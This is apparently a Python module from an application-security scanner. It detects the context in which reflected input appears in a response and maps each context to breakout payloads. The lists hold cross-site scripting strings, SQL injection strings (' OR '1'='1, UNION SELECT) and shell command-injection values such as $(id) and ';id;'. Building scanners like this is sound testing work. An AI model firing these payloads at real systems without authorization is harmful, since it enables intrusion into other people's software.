"""
Context Analyzer for Surgical Payload Generation.
This module identifies the execution context of a reflection to generate 
the most effective mutation for breaking out and proving impact.
"""

import re
import logging
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

class ContextType:
    HTML_TEXT = "html_text"         # <div>[REF]</div>
    HTML_ATTR = "html_attr"         # <input value="[REF]">
    HTML_TAG_NAME = "html_tag"      # <[REF] ...>
    JS_STRING = "js_string"         # var x = "[REF]";
    JS_CODE = "js_code"             # <script>[REF]</script>
    SQL_STRING = "sql_string"       # WHERE name = '[REF]'
    SQL_IDENTIFIER = "sql_id"       # ORDER BY [REF]
    SHELL_STRING = "shell_string"   # echo "[REF]"
    UNKNOWN = "unknown"

class ContextAnalyzer:
    def __init__(self):
        self.probe_string = "ASPM_CTX_'{<\""
        
    def analyze(self, body: str, reflection: str) -> str:
        """
        Analyzes the reflection in the response body to determine context.
        """
        if not reflection in body:
            return ContextType.UNKNOWN
            
        # Find the reflection position
        try:
            start_idx = body.index(reflection)
            end_idx = start_idx + len(reflection)
            
            # Extract surrounding context (up to 100 chars before and after)
            prefix = body[max(0, start_idx-100):start_idx]
            suffix = body[end_idx:min(len(body), end_idx+100)]
            
            # 1. Check for JS Context
            if self._is_in_script_block(prefix, suffix):
                if "'" in prefix or '"' in prefix:
                    return ContextType.JS_STRING
                return ContextType.JS_CODE
                
            # 2. Check for HTML Attribute
            if re.search(r'<\w+[^>]*\w+\s*=\s*["\']?$', prefix):
                return ContextType.HTML_ATTR
                
            # 3. Check for HTML Tag Name
            if prefix.strip().endswith("<"):
                return ContextType.HTML_TAG_NAME
                
            # Default to HTML Text
            return ContextType.HTML_TEXT
            
        except Exception as e:
            logger.error("Context analysis error: %s", e)
            return ContextType.UNKNOWN

    def _is_in_script_block(self, prefix: str, suffix: str) -> bool:
        """Heuristic to check if we are inside a <script> block."""
        return "<script" in prefix.lower() and "</script>" not in prefix.lower()

    def get_breakout_payloads(self, context: str) -> List[str]:
        """Returns the most likely characters to break the identified context."""
        if context == ContextType.HTML_TEXT:
            return ["<script>alert(1)</script>", "<svg onload=alert(1)>"]
        elif context == ContextType.HTML_ATTR:
            return ["\" onmouseover=\"alert(1)", "' onmouseover='alert(1)", "\"><script>alert(1)</script>"]
        elif context == ContextType.JS_STRING:
            return ["\";alert(1);//", "';alert(1);//", "</script><script>alert(1)</script>"]
        elif context == ContextType.JS_CODE:
            return ["alert(1);", "});alert(1);({"]
        elif context == ContextType.SQL_STRING:
            return ["' OR '1'='1", "' UNION SELECT NULL--"]
        elif context == ContextType.SHELL_STRING:
            return ["\";id;\"", "';id;'", "$(id)", "`id`"]
        return ["<script>alert(1)</script>"]

analyzer = ContextAnalyzer()
